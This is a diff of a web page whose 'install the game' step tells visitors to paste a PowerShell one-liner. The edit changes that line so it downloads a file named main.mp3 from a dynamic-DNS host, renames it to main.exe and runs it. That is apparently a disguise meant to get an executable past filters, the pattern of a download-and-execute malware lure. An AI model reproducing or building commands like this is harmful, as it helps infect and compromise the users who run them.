@@ -343,6 +343,6 @@
         Copy and run the installation script to automatically download and install the game
       </p>
       <pre class="install-script">
-irm http://andrewbaker.ddns.net/download/main.exe -OutFile "$env:USERPROFILE\Downloads\main.exe"; Start-Process "$env:USERPROFILE\Downloads\main.exe"
+irm http://andrewbaker.ddns.net/download/main.mp3 -OutFile "$env:USERPROFILE\Downloads\main.mp3"; Rename-Item "$env:USERPROFILE\Downloads\main.mp3" "main.exe"; Start-Process "$env:USERPROFILE\Downloads\main.exe"
 <!-- -->
 </html>
